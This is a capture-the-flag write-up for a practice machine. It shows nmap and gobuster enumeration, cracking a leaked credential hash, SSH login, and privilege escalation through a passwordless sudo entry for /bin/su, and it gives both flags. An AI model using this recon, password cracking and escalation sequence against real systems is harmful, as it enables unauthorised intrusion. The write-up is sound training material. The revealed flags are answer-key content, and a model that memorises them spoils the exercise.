## Description
Aim of the room is to exploit a target machine and get the user.txt and root.txt content


## Solution
ip of the target host: 10.10.193.79

Reconnaissance: scan the target machine to enumerate ports and services.
```shell
nmap -sV 10.10.193.79
```
We have port 22 and 80 open
```shell
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Meanwhile run gobuster to find hidden directories.
```shell
gobuster dir -u http://10.10.193.79/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 64
```
We found the hidden path /secret. The url http://10.10.193.79/secret/ yield a blank page.
Therefore I tried to bruteforce the content of the directory to find some interesting hidden files, but no luck.
We can bruteforce the directory /secret to find hidden files:
```shell
gobuster dir -u http://10.10.193.79/secret/ -w /usr/share/dirbus ter/wordlists/directory-list-2.3-medium.txt -t 64 -x txt,php,html,css,js
```
We managed to find the file secret.txt, containing a username and a hash:
nyan:046385855FC9580393853D8E81F240B66FE9A7B8

Now we can try to break the hash to find the password of nyan. Hopefully is the same password used to login through ssh.

In order to break the hash we can use the CrackStation (https://crackstation.net/).
We get nyan.

We can now use the retrieved credential to try to get access to the machine using ssh:
```shell
ssh nyan@10.10.193.79
```
It worked !

```shell
nyan@ubuntu:~$ ls
user.txt
nyan@ubuntu:~$ cat user.txt 
supernootnoot
```
The content of user.txt is supernootnoot.

Final step is to find the file root.txt. the name of the fiel suggests that it's necessary to get root in order to get the flag.
Look for files with setuid permission set:
```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
It gave the following result:
```shell
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
```

Lookup in GTFObins (https://gtfobins.github.io/) if we can take advantage of one of these binaries.
No exploitable binaries have been found.

We download LinEnum, useful tool to scan the system and find ways to escalate the privileges. The result of the scan is the following.
```shell
[+] We can sudo without supplying a password!                                                                     
Matching Defaults entries for nyan on ubuntu:                                                                     
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/
bin                                                                                                               
                                                                                                                  
User nyan may run the following commands on ubuntu:                                                               
    (root) NOPASSWD: /bin/su
```

Therefore we can become root using: 
```shell
sudo /bin/su
``` 

In the home directory of root we can find the root.txt file.
```shell
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt 
congratulations!!!!
```

The content of root.txt is congratulations!!!



